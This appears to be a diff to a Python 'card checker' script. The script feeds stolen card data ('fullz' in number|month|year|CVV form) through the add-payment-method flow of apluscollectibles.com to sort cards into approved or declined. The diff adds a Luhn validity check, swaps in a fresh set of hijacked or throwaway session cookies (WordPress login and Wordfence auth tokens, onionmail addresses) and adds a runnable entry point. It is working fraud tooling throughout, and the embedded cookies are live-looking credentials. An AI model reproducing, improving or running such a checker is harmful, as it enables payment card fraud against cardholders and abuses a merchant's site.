@@ -60,6 +60,24 @@ def validate_expiry_date(mes, ano):
     return True, ""
 
 
+def is_valid_credit_card_number(number: str) -> bool:
+    number = number.replace(" ", "").replace("-", "")
+    if not number.isdigit():
+        return False
+
+    total = 0
+    reverse_digits = number[::-1]
+
+    for i, digit in enumerate(reverse_digits):
+        n = int(digit)
+        if i % 2 == 1:
+            n = n * 2
+            if n > 9:
+                n = n - 9
+        total += n
+
+    return total % 10 == 0
+
 async def create_payment_method(fullz, session):
     try:
         cc, mes, ano, cvv = fullz.split("|")
@@ -77,18 +95,18 @@ async def create_payment_method(fullz, session):
             'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
             '_gcl_au': '1.1.403858930.1756376751',
             '_ga': 'GA1.1.1790710832.1756376751',
-            'mailchimp.cart.current_email': 'zerotracehacked@gmail.com',
-            'mailchimp_user_previous_email': 'zerotracehacked%40gmail.com',
-            'mailchimp_user_email': 'zerotracehacked%40gmail.com',
             'mailchimp.cart.previous_email': 'zerotracehacked@gmail.com',
-            'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
             'Subscribe': 'true',
             'wordpress_test_cookie': 'WP%20Cookie%20check',
+            'mailchimp.cart.current_email': 'senryjo@onionmail.org',
+            'mailchimp_user_previous_email': 'senryjo%40onionmail.org',
+            'mailchimp_user_email': 'senryjo%40onionmail.org',
+            'sbjs_udata': 'vst%3D7%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
             'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
-            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'senryjo%7C1756732808%7CJlOnLs1dpeUnYwAlBTeimvDEGA8k9rxesoUfzzzLH8l%7C48a4443b2bbb610a2f1c5c058ee733932c812495edef18319d0cf339a726fe27',
-            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8966%7Cother%7Cread%7Ced75eba67e9a383a1c5d83eba9186b7f7bb7d7ba478504b285a6c8c447fa416b',
-            '_ga_D1Q49TMJ2C': 'GS2.1.s1756558933$o2$g1$t1756560041$j29$l0$h0',
-            'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'rehalesson%7C1756793502%7CUjEMqQWaNHUWMQwwFkTMM3zW5EOOMAv6OYQybasjPgK%7Cb17d37f5414fc65fe05da0632584a1fd6fd144967eb3237ba5aa098baf2a39e5',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8979%7Cother%7Cread%7C830d49951dadcaebacb5f5341a25b1a7bc585db9ca2f5ec1ca48a960d7cda91b',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1756620390$o7$g1$t1756620728$j35$l0$h0',
+            'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
         }
 
         headers = {
@@ -195,7 +213,7 @@ async def create_payment_method(fullz, session):
 
         cookies_update = cookies.copy()
         cookies_update.update({
-            'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+            'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
         })
 
         headers_update = {
@@ -242,6 +260,9 @@ async def create_payment_method(fullz, session):
 
 async def multi_checking(x):
     cc, mes, ano, cvv = x.split("|")
+    if not is_valid_credit_card_number(cc):
+        return f"{x} - Credit card number is invalid"
+
     valid, err = validate_expiry_date(mes, ano)
     if not valid:
         return f"{x} - {err}"
@@ -290,7 +311,7 @@ async def multi_checking(x):
         response = "Declined"
 
     if error_message:
-        return f"{x} - {error_message}  - Taken {elapsed}s"
+        return f"{x} - {error_message} - Taken {elapsed}s"
     else:
         resp = f"{x} - {response} - Taken {elapsed}s"
         if "Approved" in response:
@@ -309,5 +330,9 @@ async def main():
                 year = year[-2:]
             new_cc = f"{cc_num}|{month}|{year}|{cvv}"
             result = await multi_checking(new_cc)
-            print(result)  # keep printing for CLI
+            print(result)
             await asyncio.sleep(20)
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
